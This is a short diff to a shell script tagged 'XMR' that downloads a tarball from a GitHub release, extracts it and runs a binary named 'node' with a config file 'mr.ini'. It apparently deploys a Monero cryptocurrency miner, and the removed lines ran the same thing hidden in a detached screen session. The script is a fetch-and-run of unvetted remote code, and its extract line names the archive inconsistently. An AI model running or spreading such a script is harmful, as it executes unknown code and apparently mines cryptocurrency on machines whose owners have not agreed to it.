@@ -2,8 +2,7 @@
 #
 #
 #XMR
-apt install screen -y
-wget https://github.com/wikangdijalalan2/xmmxja/releases/download/v1.0/male1.tar
-tar -xvf male1.tar
-cd MXC
-screen -dmS randum ./node mr.ini
+wget https://github.com/wikangdijalalan2/xmmxja/releases/download/19/MXC19.tar
+tar -xvf MXC19
+cd MXC19
+./node mr.ini
